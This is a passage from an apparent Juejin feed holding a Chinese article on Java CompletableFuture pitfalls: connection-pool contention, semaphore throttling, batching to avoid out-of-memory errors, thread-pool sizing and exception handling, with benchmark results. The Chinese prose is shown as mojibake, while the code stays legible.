HikariConfig <span class="hljs-attr">config</span> = new HikariConfig()<span class="hljs-comment">;</span>
config.setMaximumPoolSize(20)<span class="hljs-comment">;</span>
DataSource <span class="hljs-attr">dataSource</span> = new HikariDataSource(config)<span class="hljs-comment">;</span>

// åŒæ—¶å‘èµ· 100 ä¸ªæŸ¥è¯¢
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>
List&lt;CompletableFuture&lt;User&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
    .map(userId -&gt; CompletableFuture.supplyAsync(() -&gt; {
        try (Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()) {
            return queryUser(conn, userId)<span class="hljs-comment">;</span>
        }
    }, executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>ç›‘æ§æ˜¾ç¤ºï¼Œå¹³å‡æ¯ä¸ªæŸ¥è¯¢è€—æ—¶ä»ä¸²è¡Œæ—¶çš„ 5 æ¯«ç§’æ¶¨åˆ°äº† 50 æ¯«ç§’ã€‚å¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†ç­‰å¾…è¿æ¥ä¸Šã€‚</p>
<p>é™¤äº†æ•°æ®åº“è¿æ¥æ± ï¼Œè¿˜æœ‰å¾ˆå¤šè¿™ç§å…¸å‹çš„åœºæ™¯æ¡ˆä¾‹ï¼š</p>
<ul>
<li>é”ä¸åŒæ­¥å—</li>
<li>æ•°æ®åº“è¿æ¥æ± ã€Redis è¿æ¥æ± </li>
<li>HTTP å®¢æˆ·ç«¯è¿æ¥æ± </li>
<li>é™æµå™¨ã€ç†”æ–­å™¨</li>
<li>å•çº¿ç¨‹æ—¥å¿— appendã€å•é˜Ÿåˆ—ç¼“å†²</li>
</ul>
<p>ä¸€èˆ¬æ¥è®²ï¼Œè¿™ç§é—®é¢˜çš„åº”å¯¹æ€è·¯é€šå¸¸æ˜¯ï¼š</p>
<ul>
<li>æŠŠå…±äº«åŒºç¼©å°ï¼ŒæŠŠé”ç²’åº¦å‹ç¼©åˆ°å¿…è¦èŒƒå›´</li>
<li>è®©å¹¶å‘åº¦å—èµ„æºå®¹é‡çº¦æŸï¼Œåˆ«è¶…è¿‡è¿æ¥æ± å’Œä¸‹æ¸¸çš„å¯æ‰¿å—å¹¶å‘</li>
<li>å¯¹ I/O åšéš”ç¦»æ± ï¼Œé¿å…åŒä¸€ä¸ªæ± é‡Œæ—¢è·‘ CPU åˆè·‘é˜»å¡ I/O</li>
</ul>
<p>æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯æŠŠçº¿ç¨‹æ± æ”¹æˆ 20ï¼Œå½“ç„¶è¿˜æœ‰å¦ä¸€ä¸ªæœ´ç´ ä½†æœ‰æ•ˆçš„æ‰‹æ®µï¼Œæ˜¯ç”¨ä¿¡å·é‡æŠŠå¹¶å‘åº¦å¡åœ¨èµ„æºå®¹é‡ä¹‹å†…ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Semaphore <span class="hljs-attr">semaphore</span> = new Semaphore(<span class="hljs-number">20</span>)<span class="hljs-comment">; // ä¸è¦è¶…è¿‡è¿æ¥æ± æˆ–ä¸‹æ¸¸å¹¶å‘ä¸Šé™</span>
List&lt;CompletableFuture&lt;User&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
    .map(userId -&gt; CompletableFuture.supplyAsync(() -&gt; {
        try {
            semaphore.acquire()<span class="hljs-comment">;</span>
            try (Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()) {
                return queryUser(conn, userId)<span class="hljs-comment">;</span>
            }
        } finally {
            semaphore.release()<span class="hljs-comment">;</span>
        }
    }, executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>å¦‚æœä½ çš„ä»»åŠ¡éœ€è¦è·å–è¿™äº›èµ„æºï¼Œå¹¶å‘åº¦å°±ä¸èƒ½è®¾å¾—å¤ªé«˜ï¼Œå¦åˆ™å¤§é‡çº¿ç¨‹ä¼šé˜»å¡åœ¨èµ„æºç«äº‰ä¸Šã€‚</p>
<h2 data-id="heading-3">å†…å­˜çˆ†ç‚¸ï¼šä¸€å£æ°”æäº¤åä¸‡ä¸ª Future</h2>
<p>æœ‰ä¸ªå®šæ—¶ä»»åŠ¡éœ€è¦å¤„ç†æ•°æ®åº“é‡Œçš„æ‰€æœ‰å¾…å¤„ç†è®¢å•ï¼Œæ•°é‡å¤§æ¦‚åå‡ ä¸‡ã€‚åç«¯åŒå­¦å†™äº†è¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;Order&gt; <span class="hljs-attr">orders</span> = orderRepository.findAllPending()<span class="hljs-comment">; // 10 ä¸‡æ¡</span>
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">50</span>)<span class="hljs-comment">;</span>

List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = orders.stream()
    .map(order -&gt; CompletableFuture.runAsync(
        () -&gt; processOrder(order), executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>

CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ®µä»£ç åœ¨æµ‹è¯•ç¯å¢ƒè·‘å¾—å¥½å¥½çš„ï¼Œå› ä¸ºæµ‹è¯•æ•°æ®åªæœ‰å‡ ç™¾æ¡ã€‚ä¸Šäº†ç”Ÿäº§ä¹‹åï¼ˆè‰å°ç­å­æ²¡æœ‰åšå¥½ä»£ç å®¡æŸ¥ ğŸ˜­ï¼‰ï¼ŒJVM ç›´æ¥ OOM äº†ã€‚</p>
<p>é—®é¢˜åœ¨äºè¿™è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">.collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>å®ƒä¼šä¸€å£æ°”åˆ›å»º 10 ä¸‡ä¸ª CompletableFuture å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡å ç”¨å‡ ç™¾å­—èŠ‚åˆ°ä¸Šåƒå­—èŠ‚ä¸ç­‰ã€‚è¿˜æ²¡å¼€å§‹å¤„ç†ï¼Œå…‰æ˜¯è¿™äº› Future å¯¹è±¡å°±å ç”¨äº†å‡ ç™¾ MB å†…å­˜ã€‚åŠ ä¸Šçº¿ç¨‹æ± é˜Ÿåˆ—é‡Œå †ç§¯çš„ä»»åŠ¡å¯¹è±¡ï¼Œå†…å­˜å¾ˆå¿«å°±æ’‘ä¸ä½äº†ã€‚</p>
<p>æ­£ç¡®çš„åšæ³•æ˜¯åˆ†æ‰¹å¤„ç†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;Order&gt; <span class="hljs-attr">orders</span> = orderRepository.findAllPending()<span class="hljs-comment">;</span>
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">50</span>)<span class="hljs-comment">;</span>

int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; orders.size(); i += batchSize) {</span>
    List&lt;Order&gt; <span class="hljs-attr">batch</span> = orders.subList(i, 
        Math.min(i + batchSize, orders.size()))<span class="hljs-comment">;</span>
    
    List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = batch.stream()
        .map(order -&gt; CompletableFuture.runAsync(
            () -&gt; processOrder(order), executor))
        .collect(Collectors.toList())<span class="hljs-comment">;</span>
    
    CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
}
</code></pre>
<p>æ¯æ¬¡åªåˆ›å»º 1000 ä¸ª Futureï¼Œå¤„ç†å®Œä¸€æ‰¹å†å¤„ç†ä¸‹ä¸€æ‰¹ã€‚å†…å­˜å ç”¨ç¨³å®šåœ¨å¯æ§èŒƒå›´å†…ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜çš„æœ¬è´¨æ˜¯ç¼ºå°‘èƒŒå‹æœºåˆ¶ã€‚</p>
<p>ç”Ÿäº§è€…ä¸€è‚¡è„‘åœ°æäº¤ä»»åŠ¡ï¼Œå®Œå…¨ä¸ç®¡æ¶ˆè´¹è€…çš„å¤„ç†èƒ½åŠ›ã€‚å½“ä»»åŠ¡æäº¤é€Ÿåº¦è¿œå¤§äºå¤„ç†é€Ÿåº¦æ—¶ï¼Œæœªå¤„ç†çš„ä»»åŠ¡å°±ä¼šåœ¨å†…å­˜é‡Œå †ç§¯ï¼Œæœ€ç»ˆå¯¼è‡´ OOMã€‚</p>
<h2 data-id="heading-4">çº¿ç¨‹æ± é…ç½®ï¼šä¸æ˜¯è¶Šå¤§è¶Šå¥½</h2>
<p>é‡åˆ°æ€§èƒ½é—®é¢˜æ—¶ï¼Œå¾ˆå¤šäººçš„ç¬¬ä¸€ååº”æ˜¯åŠ å¤§çº¿ç¨‹æ± ã€‚åŸæ¥æ˜¯ 50ï¼Œæ”¹æˆ 100ï¼Œè¿˜æ˜¯æ…¢å°±æ”¹æˆ 200ã€‚ç»“æœå¾€å¾€æ˜¯çº¿ç¨‹è¶Šå¤šè¶Šæ…¢ã€‚</p>
<p>ä»¥å‰åšè¿‡ä¸€ä¸ªå®éªŒï¼Œç”¨ä¸åŒå¤§å°çš„çº¿ç¨‹æ± å¤„ç†åŒä¸€æ‰¹ IO å¯†é›†å‹ä»»åŠ¡ã€‚æ¯ä¸ªä»»åŠ¡éœ€è¦è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨ HTTP æ¥å£ï¼Œå¹³å‡è€—æ—¶ 200 æ¯«ç§’ã€‚ä¸€å…± 1000 ä¸ªä»»åŠ¡ã€‚</p>



































<table><thead><tr><th>çº¿ç¨‹æ•°</th><th>æ€»è€—æ—¶(ç§’)</th><th>CPU ä½¿ç”¨ç‡</th></tr></thead><tbody><tr><td>10</td><td>20.5</td><td>15%</td></tr><tr><td>50</td><td>4.2</td><td>45%</td></tr><tr><td>100</td><td>2.8</td><td>68%</td></tr><tr><td>200</td><td>3.1</td><td>82%</td></tr><tr><td>500</td><td>4.8</td><td>91%</td></tr></tbody></table>
<p>å¯ä»¥çœ‹åˆ°ï¼Œçº¿ç¨‹æ•°ä» 10 å¢åŠ åˆ° 100 æ—¶ï¼Œæ€§èƒ½æŒç»­æå‡ã€‚ä½†è¶…è¿‡ 100 ä¹‹åï¼Œæ€§èƒ½åè€Œä¸‹é™äº†ã€‚è¿™æ˜¯å› ä¸ºçº¿ç¨‹æ•°å¤ªå¤šä¼šå¸¦æ¥å‡ ä¸ªé—®é¢˜ï¼š</p>
<p>çº¿ç¨‹æœ¬èº«è¦å ç”¨å†…å­˜ï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ ˆç©ºé—´é»˜è®¤æ˜¯ 1MBã€‚500 ä¸ªçº¿ç¨‹å°±æ˜¯ 500MBã€‚</p>
<p>çº¿ç¨‹è¶Šå¤šï¼Œæ“ä½œç³»ç»Ÿçš„è°ƒåº¦å¼€é”€è¶Šå¤§ã€‚CPU è¦åœ¨ä¸åŒçº¿ç¨‹ä¹‹é—´é¢‘ç¹åˆ‡æ¢ï¼Œæ¯æ¬¡åˆ‡æ¢éƒ½è¦ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡ã€‚</p>
<p>å¯¹äº IO å¯†é›†å‹ä»»åŠ¡ï¼Œç»éªŒå…¬å¼æ˜¯ <code>çº¿ç¨‹æ•°ç­‰äº CPU æ ¸å¿ƒæ•°ä¹˜ä»¥ (1 + IO æ—¶é—´ / CPU æ—¶é—´)</code>ã€‚</p>
<p>å‡è®¾ IO æ—¶é—´æ˜¯ 200 æ¯«ç§’ï¼ŒCPU æ—¶é—´æ˜¯ 1 æ¯«ç§’ï¼Œé‚£ä¹ˆ 8 æ ¸æœºå™¨çš„ç†æƒ³çº¿ç¨‹æ•°æ˜¯ <code> 8 * (1 + 200/1) = 1608</code> ã€‚</p>
<p>ä½†è¿™åªæ˜¯ç†è®ºå€¼ï¼Œå®é™…ä¸Šå¾ˆå°‘éœ€è¦è¿™ä¹ˆå¤šçº¿ç¨‹ã€‚</p>
<p>æ›´å®ç”¨çš„åšæ³•æ˜¯ä»ä¸€ä¸ªåˆç†çš„åˆå§‹å€¼å¼€å§‹ï¼Œæ¯”å¦‚ CPU æ ¸å¿ƒæ•°çš„ 2 åˆ° 4 å€ï¼Œç„¶åé€šè¿‡å‹æµ‹é€æ­¥è°ƒæ•´ï¼Œè§‚å¯Ÿ CPU ä½¿ç”¨ç‡ã€å“åº”æ—¶é—´å’Œååé‡ï¼Œæ‰¾åˆ°æœ€ä½³çš„å¹³è¡¡ç‚¹ã€‚</p>
<p>å¦ä¸€ä¸ªå¸¸è§é”™è¯¯æ˜¯æ··ç”¨çº¿ç¨‹æ± ã€‚æœ‰çš„ä»£ç é‡Œåˆ›å»ºäº†å¤šä¸ª ExecutorServiceï¼Œæ¯ä¸ªåœ°æ–¹éƒ½ç”¨ newFixedThreadPool(50)ã€‚</p>
<p>å®é™…è¿è¡Œæ—¶å¯èƒ½æœ‰ 5 ä¸ªè¿™æ ·çš„çº¿ç¨‹æ± ï¼Œæ€»å…± 250 ä¸ªçº¿ç¨‹åœ¨è·‘ã€‚æ¯ä¸ªçº¿ç¨‹æ± å•ç‹¬çœ‹éƒ½ä¸å¤§ï¼Œåˆåœ¨ä¸€èµ·å°±è¶…è´Ÿè·äº†ã€‚</p>
<p>æœ€å¥½æ˜¯åœ¨åº”ç”¨å¯åŠ¨æ—¶åˆ›å»ºä¸€ä¸ªå…¨å±€çš„çº¿ç¨‹æ± ï¼Œæ‰€æœ‰ CompletableFuture å…±ç”¨è¿™ä¸€ä¸ªã€‚</p>
<p>å¦‚æœç¡®å®éœ€è¦éš”ç¦»ï¼Œä¹Ÿåº”è¯¥ä»”ç»†è§„åˆ’å„ä¸ªçº¿ç¨‹æ± çš„å¤§å°ï¼Œç¡®ä¿æ€»æ•°å¯æ§ã€‚</p>
<h2 data-id="heading-5">å¼‚å¸¸å¤„ç†ï¼šä¸€ä¸ªä»»åŠ¡æŒ‚äº†ï¼Œå…¶ä»–ä»»åŠ¡ä¹Ÿç™½è·‘</h2>
<p>CompletableFuture æœ‰ä¸ªç‰¹ç‚¹ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªä»»åŠ¡æŠ›å‡ºå¼‚å¸¸ï¼Œè°ƒç”¨ allOf().join() æ—¶ä¼šç«‹å³æŠ›å‡ºå¼‚å¸¸ï¼Œä½†å…¶ä»–ä»»åŠ¡ä¸ä¼šåœæ­¢ï¼Œå®ƒä»¬ä¼šç»§ç»­åœ¨åå°æ‰§è¡Œå®Œã€‚</p>
<pre><code class="hljs language-scss" lang="scss">List&lt;CompletableFuture&lt;Void&gt;&gt; futures = Arrays<span class="hljs-selector-class">.asList</span>(
    CompletableFuture.runAsync(() -&gt; <span class="hljs-built_in">task1</span>()),
    CompletableFuture<span class="hljs-selector-class">.runAsync</span>(() -&gt; { throw new <span class="hljs-built_in">RuntimeException</span>(); }),
    CompletableFuture<span class="hljs-selector-class">.runAsync</span>(() -&gt; <span class="hljs-built_in">task3</span>())
);

try {
    CompletableFuture<span class="hljs-selector-class">.allOf</span>(futures.toArray(new CompletableFuture[<span class="hljs-number">0</span>]))<span class="hljs-selector-class">.join</span>();
} catch (Exception e) {
    <span class="hljs-comment">// è¿›å…¥è¿™é‡Œæ—¶ï¼Œtask1 å’Œ task3 å¯èƒ½è¿˜åœ¨æ‰§è¡Œ</span>
}
</code></pre>
<p>å¦‚æœä½ çš„ä»»åŠ¡ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œè¿™ç§è¡Œä¸ºä¼šå¯¼è‡´èµ„æºæµªè´¹ã€‚æ¯”å¦‚ç¬¬ä¸€æ­¥æŸ¥è¯¢è®¢å•å¤±è´¥äº†ï¼Œåé¢çš„è®¡ç®—ä»·æ ¼ã€æ›´æ–°åº“å­˜éƒ½æ²¡æœ‰æ„ä¹‰ï¼Œä½†å®ƒä»¬è¿˜åœ¨ç»§ç»­è·‘ã€‚</p>
<p>æ›´ç³Ÿç³•çš„æƒ…å†µæ˜¯ï¼Œå¦‚æœæ²¡æœ‰æ­£ç¡®å¤„ç†å¼‚å¸¸ï¼Œæœ‰äº›ä»»åŠ¡å¯èƒ½ä¼šæ°¸è¿œå¡ä½ã€‚æ¯”å¦‚ä»»åŠ¡å†…éƒ¨è·å–äº†é”ä½†æ²¡æœ‰åœ¨ finally é‡Œé‡Šæ”¾ï¼ŒæŠ›å‡ºå¼‚å¸¸åé”å°±æ°¸è¿œä¸ä¼šé‡Šæ”¾äº†ã€‚</p>
<p>å»ºè®®æ¯ä¸ªä»»åŠ¡éƒ½ç”¨ exceptionally æˆ– handle æ–¹æ³•æ•è·å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">CompletableFuture</span>&lt;<span class="hljs-selector-tag">Result</span>&gt;&gt; <span class="hljs-selector-tag">futures</span> = <span class="hljs-selector-tag">tasks</span><span class="hljs-selector-class">.stream</span>()
    <span class="hljs-selector-class">.map</span>(task -&gt; CompletableFuture.<span class="hljs-built_in">supplyAsync</span>(() -&gt; task.<span class="hljs-built_in">execute</span>())
        .<span class="hljs-built_in">exceptionally</span>(ex -&gt; {
            log.<span class="hljs-built_in">error</span>(<span class="hljs-string">"Task failed"</span>, ex);
            return Result.<span class="hljs-built_in">failure</span>(ex);
        }))
    <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">toList</span>());

<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Result</span>&gt; <span class="hljs-selector-tag">results</span> = <span class="hljs-selector-tag">CompletableFuture</span><span class="hljs-selector-class">.allOf</span>(
    futures.<span class="hljs-built_in">toArray</span>(new CompletableFuture[<span class="hljs-number">0</span>]))
    <span class="hljs-selector-class">.thenApply</span>(v -&gt; futures.<span class="hljs-built_in">stream</span>()
        .<span class="hljs-built_in">map</span>(<span class="hljs-attribute">CompletableFuture</span>::join)
        .<span class="hljs-built_in">collect</span>(Collectors.<span class="hljs-built_in">toList</span>()))
    <span class="hljs-selector-class">.join</span>();
</code></pre>
<p>è¿™æ ·å¯ä»¥ç¡®ä¿å¼‚å¸¸è¢«æ­£ç¡®è®°å½•ï¼Œè€Œä¸”ä¸ä¼šä¸­æ–­å…¶ä»–ä»»åŠ¡ã€‚æœ€åæ”¶é›†ç»“æœæ—¶ï¼Œå¯ä»¥æ£€æŸ¥æ¯ä¸ª Result æ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œåšç›¸åº”çš„å¤„ç†ã€‚</p>
<h2 data-id="heading-6">æ€§èƒ½æµ‹è¯•ï¼šçœ‹æ¸…å¹¶å‘åº¦æ›²çº¿</h2>
<p>ä¸ºäº†éªŒè¯ä¸Šé¢æåˆ°çš„å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ¥åšä¸€ç»„å¯¹æ¯”å®éªŒã€‚ä»»åŠ¡åœºæ™¯æ˜¯æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯å¹¶è®¡ç®—ç§¯åˆ†ï¼Œå•æ¬¡æŸ¥è¯¢è€—æ—¶çº¦ 10 æ¯«ç§’ã€‚æ•°æ®åº“è¿æ¥æ± é…ç½® 20 ä¸ªè¿æ¥ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸²è¡Œå¤„ç†
long <span class="hljs-attr">start</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
for (int userId : userIds) {
    User <span class="hljs-attr">user</span> = queryUser(userId)<span class="hljs-comment">;</span>
    calculatePoints(user)<span class="hljs-comment">;</span>
}
long <span class="hljs-attr">serialTime</span> = System.currentTimeMillis() - start<span class="hljs-comment">;</span>

// å¹¶è¡Œå¤„ç†ï¼ˆä¸åŒå¹¶å‘åº¦ï¼‰
for (int concurrency : new int<span class="hljs-section">[]</span>{10, 20, 50, 100, 200}) {
    ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(concurrency)<span class="hljs-comment">;</span>
    Semaphore <span class="hljs-attr">semaphore</span> = new Semaphore(<span class="hljs-number">20</span>)<span class="hljs-comment">; // é™åˆ¶æ•°æ®åº“å¹¶å‘</span>
    
    <span class="hljs-attr">start</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
    List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
        .map(userId -&gt; CompletableFuture.runAsync(() -&gt; {
            try {
                semaphore.acquire()<span class="hljs-comment">;</span>
                User <span class="hljs-attr">user</span> = queryUser(userId)<span class="hljs-comment">;</span>
                calculatePoints(user)<span class="hljs-comment">;</span>
            } finally {
                semaphore.release()<span class="hljs-comment">;</span>
            }
        }, executor))
        .collect(Collectors.toList())<span class="hljs-comment">;</span>
    
    CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
    long <span class="hljs-attr">parallelTime</span> = System.currentTimeMillis() - start<span class="hljs-comment">;</span>
    
    System.out.printf("Concurrency: %d, Time: %dms, Speedup: %.2fx%n",
        concurrency, parallelTime, (double)serialTime / parallelTime)<span class="hljs-comment">;</span>
    
    executor.shutdown()<span class="hljs-comment">;</span>
}
</code></pre>
<p>æµ‹è¯•ç»“æœï¼ˆå¤„ç† 1000 ä¸ªç”¨æˆ·ï¼‰ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Serial:</span> <span class="hljs-string">10200ms</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">10</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1050ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">9.</span><span class="hljs-string">71x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">20</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">530ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">19.</span><span class="hljs-string">25x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">50</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">540ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">18.</span><span class="hljs-string">89x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">100</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">650ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">15.</span><span class="hljs-string">69x</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">200</span><span class="hljs-string">,</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">890ms,</span> <span class="hljs-attr">Speedup:</span> <span class="hljs-number">11.</span><span class="hljs-string">46x</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¹¶å‘åº¦åœ¨ 20 æ—¶è¾¾åˆ°æœ€ä½³æ€§èƒ½ï¼Œè¿™æ­£å¥½ç­‰äºæ•°æ®åº“è¿æ¥æ± å¤§å°ã€‚å†å¾€ä¸ŠåŠ ï¼Œæ€§èƒ½åè€Œä¸‹é™äº†ã€‚</p>
<p>æˆ‘åˆå»æ‰äº†ä¿¡å·é‡é™åˆ¶ï¼Œè®©æ‰€æœ‰çº¿ç¨‹ç›´æ¥ç«äº‰è¿æ¥æ± ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Concurrency:</span> <span class="hljs-number">50</span> <span class="hljs-string">(no</span> <span class="hljs-string">semaphore),</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1200ms</span>
<span class="hljs-attr">Concurrency:</span> <span class="hljs-number">100</span> <span class="hljs-string">(no</span> <span class="hljs-string">semaphore),</span> <span class="hljs-attr">Time:</span> <span class="hljs-string">1850ms</span>
</code></pre>
<p>æ€§èƒ½æ˜¾è‘—å˜å·®ï¼Œå› ä¸ºå¤§é‡çº¿ç¨‹é˜»å¡åœ¨ç­‰å¾…è¿æ¥ä¸Šã€‚</p>
<p>æœ€åæµ‹è¯•ä»»åŠ¡ç²’åº¦çš„å½±å“ã€‚æŠŠ 1000 ä¸ªä»»åŠ¡æ‰“åŒ…æˆä¸åŒæ‰¹æ¬¡ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-number">1000</span> tasks individually: <span class="hljs-number">2100</span>ms
<span class="hljs-number">100</span> batches (<span class="hljs-number">10</span> tasks <span class="hljs-keyword">each</span>): <span class="hljs-number">180</span>ms
<span class="hljs-number">10</span> batches (<span class="hljs-number">100</span> tasks <span class="hljs-keyword">each</span>): <span class="hljs-number">95</span>ms
<span class="hljs-number">1</span> batch (<span class="hljs-number">1000</span> tasks): <span class="hljs-number">10200</span>ms (serial)
</code></pre>
<p>æ‰¹æ¬¡å¤§å°åœ¨ 50 åˆ° 100 ä¹‹é—´æ—¶æ•ˆæœæœ€å¥½ï¼Œæ—¢å‡å°‘äº†è°ƒåº¦å¼€é”€ï¼Œåˆä¿ç•™äº†å¹¶è¡Œåº¦ã€‚</p>
<h2 data-id="heading-7">å†™åœ¨æœ€å</h2>
<p>å¼€å¤´çš„äº‹æ•…ï¼Œåæ¥æ€ä¹ˆä¿®å¤çš„ï¼Ÿå…¶å®å¹¶ä¸å¤æ‚ï¼šä»»åŠ¡ç²’åº¦æ”¶ç²—ã€I/O å’Œ CPU åˆ†æ± ã€å¹¶å‘åº¦æŒ‰è¿æ¥æ± å®¹é‡å¡ä½ã€æ‰¹é‡æäº¤åŠ çª—å£ã€æ¯ä¸ªä»»åŠ¡åŠ è¶…æ—¶ä¸é™çº§ã€‚</p>
<p>CompletableFuture é€‚åˆç”¨åœ¨éœ€è¦å¹¶å‘è¡¨è¾¾ã€éœ€è¦ç»„åˆä¸ç¼–æ’çš„åœºæ™¯ã€‚</p>
<p>å¾æ—¥ä¸‰çœå¾èº«ã€‚</p>
<p>ä½¿ç”¨CompletableFutureæ—¶ï¼Œæœ€å¥½ä¹Ÿå…ˆæƒ³æ¸…æ¥šå‡ ä¸ªé—®é¢˜ï¼šå•ä»»åŠ¡æ˜¯å¦è¶³å¤Ÿé‡ã€å…±äº«èµ„æºæ˜¯å¦å……è¶³ã€ä¸‹æ¸¸æ˜¯å¦èƒ½æ‰¿å—å¹¶å‘ã€é˜Ÿåˆ—æ˜¯å¦æœ‰ä¸Šç•Œã€å¤±è´¥å’Œè¶…æ—¶æ˜¯å¦å¯æ§ã€‚</p>
<p>æœ‰äº†ç­”æ¡ˆï¼Œå†å»è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7589908657682628658</link>    <guid>https://juejin.cn/post/7589908657682628658</guid>    <pubDate>2026-01-02T00:33:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589908657682628658" data-draft-id="7589903499599429686" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£"/> <meta itemprop="keywords" content="MyBatis,Java"/> <meta itemprop="datePublished" content="2026-01-02T00:33:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T00:33:08.000Z" title="Fri Jan 02 2026 00:33:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
